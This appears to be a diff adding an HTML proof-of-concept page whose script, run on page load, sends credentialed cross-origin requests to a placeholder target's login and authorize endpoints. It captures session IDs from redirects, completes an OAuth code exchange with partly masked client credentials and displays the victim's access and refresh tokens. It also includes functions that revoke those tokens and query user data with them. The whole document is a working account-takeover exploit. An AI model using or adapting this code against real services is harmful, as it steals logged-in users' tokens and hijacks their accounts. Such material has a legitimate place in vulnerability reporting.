@@ -1,0 +1,165 @@
+<html>
+<head>
+<script>
+
+    var iscompleted =  false;
+
+    function mainFunc(){ 
+
+        var authreq = new XMLHttpRequest();
+        authreq.onload = authreqListener;
+        authreq.open('get','https://auth.target.com/login',true);
+        authreq.withCredentials = true;
+        authreq.send();
+
+        var authprodreq = new XMLHttpRequest();
+        authprodreq.onload = authprodreqListener;  
+        authprodreq.open('get','https://auth.prod.cloud.target.co/login',true); 
+        authprodreq.withCredentials = true;
+        authprodreq.send();
+
+    }
+
+    function authreqListener(){ 
+        var resurl = this.responseURL;
+        
+        if (resurl.includes('https://auth.target.com/login?authorize_session_id=')){
+            resurl= resurl.replace('https://auth.target.com/login?authorize_session_id=','');
+            console.log('auth_session_id:'+resurl);// 
+            authorizeFunc(resurl);
+        }else{
+            setTimeout(
+                function (){
+                    mainFunc(); 
+                },2500    
+            );
+        }
+
+    }
+    function authprodreqListener(){ 
+        var resurl = this.responseURL;
+        
+        if (resurl.includes('https://auth.prod.cloud.target.co/login?authorize_session_id=')){
+            resurl= resurl.replace('https://auth.prod.cloud.target.co/login?authorize_session_id=','');
+            console.log('auth_prod_session_id:'+resurl); //
+            prodauthFunc(resurl); 
+        }else{
+            setTimeout(
+                function (){
+                    mainFunc();
+                },2500    
+            );
+        }
+
+    }
+
+    function authorizeFunc(authid){ 
+        if(!iscompleted){
+            var req2 = new XMLHttpRequest();
+            req2.onload = authTokenListner;
+            req2.open('get','https://auth.target.com/authorize?client_id=59523XXXXXXXXXXXXXX0aa&redirect_uri=https%3A%2F%2Ftechnical.prod.cloud.target.co%2Foauth&response_type=code&authorize_session_id='+authid,true);            
+            req2.send();
+        }
+
+        
+    }
+
+    function authTokenListner(){
+        var resurl = this.responseURL;
+        
+        if (resurl.includes('https://auth.target.com/login?authorize_session_id=')){
+            resurl= resurl.replace('https://auth.target.com/login?authorize_session_id=','');
+            authorizeFunc(resurl);
+            console.log('fail');
+        }else{
+            setTimeout(
+                function (){
+                    console.log('success');
+                    bearerTokenFunc(resurl.replace('https://technical.prod.cloud.target.co/oauth?code=','')); 
+                },2500    
+            );
+        }
+    }
+
+    function prodauthFunc(authid){
+        if(!iscompleted){
+            var req21 = new XMLHttpRequest();
+            req21.onload = prodTokenListner;
+            req21.open('get','https://auth.prod.cloud.target.co/authorize?client_id=59523XXXXXXXXXXXXXXXXX0aa&redirect_uri=https%3A%2F%2Ftechnical.prod.cloud.target.co%2Foauth&response_type=code&authorize_session_id='+authid,true);
+            req21.send();
+        }        
+    }
+
+    function prodTokenListner(){
+       
+        var resurl = this.responseURL;        
+        if (resurl.includes('https://auth.prod.cloud.target.co/login?authorize_session_id=')){
+            resurl= resurl.replace('https://auth.prod.cloud.target.co/login?authorize_session_id=','');
+            prodauthFunc(resurl);
+            console.log('fail');
+        }else{
+            setTimeout(
+                function (){  
+                    console.log('success');
+                    bearerTokenFunc(resurl.replace('https://technical.prod.cloud.target.co/oauth?code=',''));
+                },2500    
+            );
+        }        
+    }
+        
+    function bearerTokenFunc(tkncode){
+        var req3 = new XMLHttpRequest();
+        req3.onload = bearerTokenListner;
+        req3.open('post','https://auth.prod.cloud.target.co/token?code='+tkncode+'&grant_type=authorization_code&redirect_uri=https%3A%2F%2Ftechnical.prod.cloud.target.co%2Foauth',true);
+        req3.setRequestHeader('Authorization', 'Basic NTk1MXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXYzdjYjEzOA==');
+        req3.withCredentials = true;
+        req3.send();
+
+    }
+
+    function bearerTokenListner(){
+        console.log(this.responseText);//
+        document.getElementById("tokenId").innerHTML =this.responseText;
+        iscompleted=true;
+    }
+
+    function revokeFunction(authtokens){ 
+
+        var obj = JSON.parse(authtokens);
+
+        var revokereq = new XMLHttpRequest();
+        revokereq.onload = revokereqListener;
+        revokereq.open('post','https://auth.prod.cloud.target.co/revoke?token='+obj.access_token,true);
+        revokereq.setRequestHeader('Authorization', 'Basic NTk1MjNlXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXTJkNWNjYzdjYjEzOA==');
+        revokereq.withCredentials = true;
+        revokereq.send();
+    }
+
+    function revokereqListener(){
+        console.log("successfully disabled user");
+    }
+
+    function getUserInfoFunction(authtokens){ 
+
+        var obj = JSON.parse(authtokens);
+
+        var getuseinforeq = new XMLHttpRequest();
+        getuseinforeq.onload = getuseinforeqListener;
+        getuseinforeq.open('get','https://technical.prod.cloud.target.co/api/v1/user',true);
+        getuseinforeq.setRequestHeader('Cookie', 'charge.refreshToken='+obj.refresh_token);//
+        getuseinforeq.setRequestHeader('Authorization', 'Bearer '+obj.access_token);
+        getuseinforeq.withCredentials = true;
+        getuseinforeq.send();
+    }
+
+    function getuseinforeqListener(){
+        console.log(this.responseText); 
+    }
+
+
+</script>
+</head>
+<body onload="mainFunc()">
+    <p id="tokenId">Wait For Token...</p>
+</body>
+</html>
